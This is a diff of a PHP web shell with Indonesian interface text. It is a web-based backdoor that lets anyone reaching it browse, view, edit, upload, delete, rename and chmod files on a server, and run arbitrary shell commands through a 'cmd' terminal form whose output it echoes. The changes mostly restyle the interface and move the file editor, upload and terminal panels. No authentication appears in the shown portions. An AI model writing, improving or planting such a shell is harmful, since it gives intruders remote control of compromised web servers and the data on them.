@@ -51,7 +51,7 @@ if (isset($_GET['delete'])) {
 if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
     $from = $path . DIRECTORY_SEPARATOR . $_POST['rename_from'];
     $to   = $path . DIRECTORY_SEPARATOR . $_POST['rename_to'];
-    if (file_exists($from)) rename($from, $to);
+    if (file_exists($from) && !file_exists($to)) rename($from, $to);
     header("Location: " . build_url(['path' => $path]));
     exit;
 }
@@ -237,7 +237,7 @@ $uname = php_uname();
 
 <div id="back-button">
     <a href="<?= build_url(['path' => $initial_path]) ?>" style="font-weight:bold; color:#6af;">
-        🔙 Kembali ke folder awal shell
+        🔙 Back
     </a>
 </div>
 
@@ -299,107 +299,102 @@ foreach ($all as $file) {
         ? "<a href='" . build_url(['path' => $full]) . "'>📁 " . htmlspecialchars($file) . "</a>"
         : "<a href='" . build_url(['path' => $path, 'view' => $file]) . "'>📄 " . htmlspecialchars($file) . "</a>";
 
-    $del = "<a class='del-btn' href='" . build_url(['path' => $path, 'delete' => $file]) . "' onclick=\"return confirm('Hapus $file?');\">🗑️</a>";
+    $del = "<a class='del-btn' href='" . build_url(['path' => $path, 'delete' => $file]) . "' onclick=\"return confirm('Hapus $file?');\">❌</a>";
 
-    $ren = "<form method='POST'>
+    $ren = "<form method='POST' style='display:inline; margin-left:5px;'>
                 <input type='hidden' name='rename_from' value='" . htmlspecialchars($file) . "'>
                 <input type='text' name='rename_to' size='8' placeholder='Rename'>
                 <input type='hidden' name='lelah' value=''>
                 <input type='hidden' name='path' value='" . htmlspecialchars($path) . "'>
-                <button type='submit' class='mini-btn' title='Rename'>✏️</button>
+                <input type='submit' value='OK' class='mini-btn'>
             </form>";
 
-    $chmod = "<form method='POST'>
+    $chmod = "<form method='POST' style='display:inline; margin-left:5px;'>
                 <input type='hidden' name='chmod_file' value='" . htmlspecialchars($file) . "'>
-                <input type='text' name='new_perm' size='4' placeholder='0755'>
+                <input type='text' name='new_perm' size='4' value='$perm'>
                 <input type='hidden' name='lelah' value=''>
                 <input type='hidden' name='path' value='" . htmlspecialchars($path) . "'>
-                <button type='submit' class='mini-btn' title='Change Permission'>🔒</button>
-              </form>";
-
-    $edit = is_file($full) ? "<a class='mini-btn' href='" . build_url(['path' => $path, 'edit' => $file]) . "' title='Edit File'>✍️</a>" : "";
+                <input type='submit' value='OK' class='mini-btn'>
+            </form>";
 
     echo "<div class='flex-row'>
         <div class='col-name'>$link</div>
-        <div class='col-size'>$size</div>
-        <div class='col-user'>$user</div>
-        <div class='col-group'>$group</div>
-        <div class='col-perm'>$perm</div>
+        <div class='col-size' style='text-align:right;'>$size</div>
+        <div class='col-user' style='text-align:center;'>$user</div>
+        <div class='col-group' style='text-align:center;'>$group</div>
+        <div class='col-perm' style='text-align:center;'>$perm</div>
         <div class='col-time'>$time</div>
-        <div class='col-action'>$del $ren $chmod $edit</div>
+        <div class='col-action'>$del $ren $chmod</div>
     </div>";
 }
 echo "</div>";
-
-// File viewer atau editor
-if (isset($_GET['view'])) {
-    $viewFile = $path . DIRECTORY_SEPARATOR . $_GET['view'];
-    if (is_file($viewFile)) {
-        $content = htmlspecialchars(file_get_contents($viewFile));
-        echo "<div class='box'><b>📄 Isi file:</b> " . htmlspecialchars($_GET['view']) . "<pre>$content</pre></div>";
-    }
-} elseif (isset($_GET['edit'])) {
-    $editFile = $path . DIRECTORY_SEPARATOR . $_GET['edit'];
-    if (is_file($editFile)) {
-        $content = htmlspecialchars(file_get_contents($editFile));
-        echo "<div class='box'><b>✍️ Edit file:</b> " . htmlspecialchars($_GET['edit']) . "
-            <form method='POST'>
-                <input type='hidden' name='filename' value='" . htmlspecialchars($_GET['edit']) . "'>
-                <textarea name='save_file' style='width:100%; height:300px; background:#111; color:#0f0; border:1px solid #555; font-family: monospace;'>$content</textarea><br>
-                <input type='hidden' name='lelah' value=''>
-                <input type='hidden' name='path' value='" . htmlspecialchars($path) . "'>
-                <input type='submit' value='Simpan Perubahan'>
-            </form>
-        </div>";
-    }
-}
 ?>
-    </div> <!-- end file-list -->
+    </div>
 
     <div id="side-panel">
-        <div id="actions">
-            <h3>🆕 Buat & Upload</h3>
-            <form method="POST" style="margin-bottom:5px;">
-                <input type="text" name="new_file" placeholder="nama_file.txt" required>
-                <input type="hidden" name="lelah" value="">
-                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
-                <input type="submit" value="Buat File">
-            </form>
-            <form method="POST" style="margin-bottom:5px;">
-                <input type="text" name="new_folder" placeholder="nama_folder" required>
-                <input type="hidden" name="lelah" value="">
-                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
-                <input type="submit" value="Buat Folder">
-            </form>
-            <form method="POST" enctype="multipart/form-data" style="margin-bottom:5px;">
-                <input type="file" name="upload" required>
-                <input type="hidden" name="lelah" value="">
-                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
-                <input type="submit" value="Upload File">
-            </form>
-        </div>
-        <div id="terminal">
-            <h3>💻 Terminal</h3>
-            <form method="POST">
-                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
-                <input type="hidden" name="lelah" value="">
-                <input type="text" name="cmd" placeholder="Perintah shell..." style="width:90%;">
-                <input type="submit" value="Run">
-            </form>
-<?php
-if ($output) {
-    echo "<pre>" . htmlspecialchars($output) . "</pre>";
-}
-?>
-        </div>
-    </div> <!-- end side-panel -->
-</div> <!-- end container -->
 
-<script>
-    document.addEventListener("DOMContentLoaded", function() {
-        document.body.classList.add("fade-in");
-    });
-</script>
+        <!-- File Edit Panel -->
+<?php if (isset($_GET['view']) && is_file($path . DIRECTORY_SEPARATOR . $_GET['view'])): 
+    $file_view = $path . DIRECTORY_SEPARATOR . $_GET['view'];
+    $content = htmlspecialchars(file_get_contents($file_view));
+?>
+    <div>
+        <h3>Edit File: <?= htmlspecialchars($_GET['view']) ?></h3>
+        <form method="POST">
+            <textarea name="save_file" rows="15" style="width:100%; background:#111; color:#0f0;"><?= $content ?></textarea>
+            <input type="hidden" name="filename" value="<?= htmlspecialchars($_GET['view']) ?>">
+            <input type="hidden" name="lelah" value="">
+            <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+            <input type="submit" value="Simpan" style="width:100%; margin-top:5px;">
+        </form>
+    </div>
+<?php else: ?>
+    <div>
+        <h3>Tidak ada file yang dipilih untuk diedit</h3>
+    </div>
+<?php endif; ?>
+
+        <!-- New Folder & New File -->
+        <div>
+            <h3>Buat Folder / File Baru</h3>
+            <form method="POST" style="margin-bottom:10px;">
+                <input type="text" name="new_folder" placeholder="Nama folder baru" style="width:100%;">
+                <input type="hidden" name="lelah" value="">
+                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+                <input type="submit" value="Buat Folder" style="width:100%; margin-top:5px;">
+            </form>
+            <form method="POST">
+                <input type="text" name="new_file" placeholder="Nama file baru" style="width:100%;">
+                <input type="hidden" name="lelah" value="">
+                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+                <input type="submit" value="Buat File" style="width:100%; margin-top:5px;">
+            </form>
+        </div>
+
+        <!-- Upload File -->
+        <div>
+            <h3>Upload File</h3>
+            <form method="POST" enctype="multipart/form-data">
+                <input type="file" name="upload" style="width:100%;">
+                <input type="hidden" name="lelah" value="">
+                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+                <input type="submit" value="Upload" style="width:100%; margin-top:5px;">
+            </form>
+        </div>
+
+        <!-- Terminal -->
+        <div>
+            <h3>Terminal (Shell Command)</h3>
+            <form method="POST">
+                <input type="text" name="cmd" placeholder="Masukkan perintah shell" style="width:100%;" autocomplete="off">
+                <input type="hidden" name="lelah" value="">
+                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+                <input type="submit" value="Jalankan" style="width:100%; margin-top:5px;">
+            </form>
+            <pre><?= htmlspecialchars($output) ?></pre>
+        </div>
+    </div>
+</div>
 
 </body>
 </html>
